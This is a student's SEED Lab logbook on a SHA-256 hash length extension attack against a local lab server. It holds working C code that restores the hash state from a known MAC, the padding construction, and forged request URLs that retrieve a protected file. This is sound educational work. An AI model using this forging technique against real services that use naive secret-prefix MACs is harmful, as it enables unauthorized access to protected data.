# Logbook #10

> Environment Setup:
>
> - Add `10.9.0.80  www.seedlab-hashlen.com` to /etc/hosts;
> - Run `docker-compose up` in LabSetup.

> Considere as seguintes notas, durante a resolução do mesmo:
> O objetivo geral deste SEED Lab é mostrar que é possível explorar uma fraqueza na autenticação para obter autenticações (MACs) de mensagens que não foram construidas de forma honesta. Para isto, vamos ter que seguir 3 passos, que seguem sensivelmente as tarefas do guião:
>
> 1. Obter (computar) um pedido autenticado honesto que lista os ficheiros de um servidor
> 2. Calcular o padding necessário para que o pedido anterior seja exatamente do tamanho de um bloco na função de hash
> 3. Executar a função de compressão de hash sobre este último pedido, de forma a conseguir uma autenticação do pedido original + padding + a mensagem que bem nos apetecer

## Task 1: Send Request to List Files

The following parameters will be used for the request:

- `uid`: 1001
- `key`: 123456
- `name`: GuilhermeMatos

1. Construct the key and message for the MAC calculation:

   ```
   123456:myname=GuilhermeMatos&uid=1001&lstcmd=1
   ```
2. Calculate the MAC for the message:

   ```bash
   $ echo -n "123456:myname=GuilhermeMatos&uid=1001&lstcmd=1" | sha256sum
   30639d3231b1702c2174fceaca50cdfafa895d98e47caf04d2759e53ab618750  -
   ```
3. Send the request to the server: http://www.seedlab-hashlen.com/?myname=GuilhermeMatos&uid=1001&lstcmd=1&mac=30639d3231b1702c2174fceaca50cdfafa895d98e47caf04d2759e53ab618750

   ```html
   <b>Yes, your MAC is valid</b>
   <h3>List Directory</h3>
   <ol>
     <li>secret.txt</li>
     <li>key.txt</li>
   </ol>
   ```

The same approach can be used to create a download request:

1. Construct the key and message for the MAC calculation:

   ```
   123456:myname=GuilhermeMatos&uid=1001&lstcmd=1&download=secret.txt
   ```
2. Calculate the MAC for the message:

   ```bash
   $ echo -n "123456:myname=GuilhermeMatos&uid=1001&lstcmd=1&download=secret.txt" | sha256sum
   8676ef4fba82819842c7124672c8780d8a934faf9a9495b5e157d43be97b7374  -
   ```
3. Send the request to the server: <http://www.seedlab-hashlen.com/?myname=GuilhermeMatos&uid=1001&lstcmd=1&download=secret.txt&mac=8676ef4fba82819842c7124672c8780d8a934faf9a9495b5e157d43be97b7374>

   ```html
   <b>Yes, your MAC is valid</b>
       <h3>List Directory</h3>
       <ol> 
           <li>secret.txt</li>
           <li>key.txt</li>
       </ol>
       <h3>File Content</h3>
           <p>TOP SECRET.</p>
           <p>DO NOT DISCLOSE.</p>
           <p></p>
   ```

It is worth noting that, as expected, the server will return an "Invalid MAC" error if, for example, the name is incorrect or the MAC is not valid. For example, the request http://www.seedlab-hashlen.com/?myname=INVALIDNAME&uid=1001&lstcmd=1&mac=30639d3231b1702c2174fceaca50cdfafa895d98e47caf04d2759e53ab618750 :

```html
<b>Sorry, your MAC is not valid</b>
```

## Task 2: Create Padding

Message: `myname=GuilhermeMatos&uid=1001&lstcmd=1` 

Key: `123456`

This message is 39 bytes long. Therefore, the padding length will be 64 – 46 = 18. This length in bits will be 46 \* 8 = 368, which is 0x170 in hexadecimal.

Since 2 bytes will be used for the padding length (\\x01\\x70) and another is reserved for the beginning of the message with value 0x80, it leaves us with 18 - 3 = 15 bytes left for zeroes.

Now we can build the padding:

> "123456:myname=GuilhermeMatos&uid=1001&lstcmd=1"
>
> "\\x80"
>
> "\\x00\\x00\\x00\\x00\\x00"
>
> "\\x00\\x00\\x00\\x00\\x00"
>
> "\\x00\\x00\\x00\\x00\\x00"
>
> "\\x01\\x70"

The message with padding will then be:

> myname=GuilhermeMatos&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%70

## Task 3: The Length Extension Attack

Let's remember the MAC we got from Task 1:

<http://www.seedlab-hashlen.com/?myname=GuilhermeMatos&uid=1001&lstcmd=1&mac=30639d3231b1702c2174fceaca50cdfafa895d98e47caf04d2759e53ab618750>

> 30639d3231b1702c2174fceaca50cdfafa895d98e47caf04d2759e53ab618750

---

Since we want to use the download command on the 'secret.txt' file, we need to use an URL on the format below:

```
http://www.seedlab-hashlen.com/?myname=<name>&uid=<uid>
&lstcmd=1<padding>&download=secret.txt&mac=<new-mac>
```

The difference from this URL to the previous one is that now, we need to append `&download=secret.txt` to the command. Therefore we need to generate a new MAC with the code below:

```C
/* length_ext.c */
#include <stdio.h>
#include <arpa/inet.h>
#include <openssl/sha.h>

int main(int argc, const char *argv[]) {
    int i;
    unsigned char buffer[SHA256_DIGEST_LENGTH];
    SHA256_CTX c;
    SHA256_Init(&c);
    for(i=0; i<64; i++)
        SHA256_Update(&c, "*", 1);

    // MAC of the original message M (padded)
    c.h[0] = htole32(0x30639d32);
    c.h[1] = htole32(0x31b1702c);
    c.h[2] = htole32(0x2174fcea);
    c.h[3] = htole32(0xca50cdfa);
    c.h[4] = htole32(0xfa895d98);
    c.h[5] = htole32(0xe47caf04);
    c.h[6] = htole32(0xd2759e53);
    c.h[7] = htole32(0xab618750);

    // Append additional message
    SHA256_Update(&c, "&download=secret.txt", 20);
    SHA256_Final(buffer, &c);

    for(i = 0; i < 32; i++) {
        printf("%02x", buffer[i]);
    }
    printf("\n");
    return 0;
}
```

Compile this code with:

```bash
$ gcc length_ext.c -o length_ext -lcrypto
```

Executing `length_ext` will output our new MAC:

> eb1a7bf9cf98104d7289afe671e8eb5c3c536df7e0a7e6a8979e40225d4d5156

---

We now form the link:

http://www.seedlab-hashlen.com/?myname=GuilhermeMatos&uid=1001&lstcmd=1%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%01%70&download=secret.txt&mac=eb1a7bf9cf98104d7289afe671e8eb5c3c536df7e0a7e6a8979e40225d4d5156

And successfully get the contents of secret.txt:

```html
<b>Yes, your MAC is valid</b>
<h3>File Content</h3>
<p>TOP SECRET.</p>
<p>DO NOT DISCLOSE.</p>
<p></p>
```